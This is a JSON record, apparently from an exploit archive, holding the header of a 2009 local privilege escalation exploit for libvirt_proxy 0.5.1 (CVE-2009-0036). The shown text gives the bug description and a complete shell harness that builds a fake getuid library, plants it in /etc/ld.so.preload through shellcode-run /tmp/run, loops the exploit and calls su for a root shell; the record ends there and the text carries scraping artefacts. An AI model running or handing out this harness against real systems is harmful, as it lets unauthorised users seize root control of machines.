{
    "text": "title : libvirt_proxy 0.5.1 Privilege Escalation  ， detail : libvirt_proxy versions 0.5.1 and below local privilege escalation exploit.  ， cve : advisories | CVE-2009-0036  ，  ， desc : / *   ，  * cve-2009-0036.c  ，  ，  * libvirt_proxy <= 0.5.1 Local Privilege Escalation Exploit  ，  * Jon Oberheide <jon @ oberheide.org>  ，  * http : /jon.oberheide.org  ，  ，  * Information :   ，  ，  * http : /cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0036  ，  ，  * Buffer overflow in the proxyReadClientSocket function in  ，  * proxy/libvirt_proxy.c in libvirt_proxy 0.5.1 might allow local users to  ，  * gain privileges by sending a portion of the header of a virProxyPacket  ，  * packet , and then sending the remainder of the packet with crafted values  ，  * in the header , related to use of uninitialized memory in a validation  ，  * check.  ，  ，  * Usage :   ，  ，  * We're guessing to hit our NOP sled , so this program should be run in a  ，  * harness. Since the shellcode will execute /tmp/run as root , the following  ，  * harness will insert a malicious getuid.so payload in /etc/ld.so.preload.  ，  ，  *  #  ! /bin/sh  ，  ，  * echo \" [ + ] compiling the exploit\"  ，  * gcc cve-2009-0036.c -o cve-2009-0036  ，  ，  * echo \" [ + ] creating /tmp/getuid.so\"  ，  * echo \"int getuid (  ) {return 0 ; }\" > /tmp/getuid.c  ，  * gcc -shared /tmp/getuid.c -o /tmp/getuid.so  ，  ，  * echo \" [ + ] setting up /tmp/run\"  ，  * echo -e \" #  ! /bin/sh\" > /tmp/run  ，  * echo -e \"touch /tmp/success\" > /tmp/run  ，  * echo -e \"echo \\\"/tmp/getuid.so\\\" > /etc/ld.so.preload\" > /tmp/run  ，  * chmod +x /tmp/run  ，  ，  * echo \" [ + ] starting exploit loop\"  ，  * i=0  ，  * rm -f /tmp/success  ，  * while [  ! -e \"/tmp/success\" ]   ，  * do  ，  * i= $  (  $ i+1 )   ，  * echo \"RUN NUMBER $ i\"  ，  * ./cve-2009-0036  ，  * done  ，  ，  * echo \" [ + ] our getuid.so is now in ld.so.preload\"  ，  * echo \" [ + ] running su to obtain root shell\"  ，  * su",
    "time": "Apr 28, 2009"
}